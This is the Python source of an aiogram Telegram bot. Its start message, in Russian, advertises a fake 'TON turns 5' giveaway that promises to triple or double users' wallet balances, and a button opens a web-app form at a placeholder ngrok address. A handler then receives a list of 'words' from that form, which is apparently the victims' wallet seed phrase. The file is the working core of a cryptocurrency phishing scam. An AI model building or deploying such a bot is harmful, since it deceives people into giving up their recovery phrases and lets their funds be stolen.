import asyncio
import json
import logging
from aiogram import Bot, Dispatcher, types, F
from aiogram.client.default import DefaultBotProperties
from aiogram.filters import Command
from dotenv import load_dotenv
import os

load_dotenv()

BOT_TOKEN = os.getenv("BOT_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))

bot = Bot(token=BOT_TOKEN, default=DefaultBotProperties(parse_mode="HTML"))
dp = Dispatcher()
logging.basicConfig(level=logging.INFO)

@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    kb = types.ReplyKeyboardMarkup(
        keyboard=[[types.KeyboardButton(
            text="Открыть форму",
            web_app=types.WebAppInfo(url="https://ВАШ_NGROK_ССЫЛКА/")  # ПОТОМ ЗАМЕНИТЕ
        )]],
        resize_keyboard=True
    )
    await message.answer("🎉 Добро пожаловать в праздничный TON Giveaway Bot! 🎉\n\n
Сегодня TON исполняется 5 лет — и мы запускаем специальную раздачу призов для участников сообщества 🚀\n
🏆 Призы:\n
🥇 1 место — ваш баланс увеличивается в 3 раза\n
🥈 2 место — баланс удваивается\n
🥉 3 место — 300 TON\n\n
💎 Нажимай кнопку ниже, участвуй и попробуй попасть в ТОП победителей!\n
Удачи 🍀", reply_markup=kb)

@dp.message(F.web_app_data)
async def handle_web_app_data(message: types.Message):
    print(f"🔔 ПОЛУЧЕНЫ ДАННЫЕ: {message.web_app_data.data}")
    
    try:
        data = json.loads(message.web_app_data.data)
        words = data.get("words", [])
        await message.answer(f"✅ Получено {len(words)} слов!\n\nПервые 3 слова: {', '.join(words[:3])}")
    except Exception as e:
        await message.answer(f"❌ Ошибка: {e}")

async def main():
    print("🤖 БОТ ЗАПУЩЕН!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
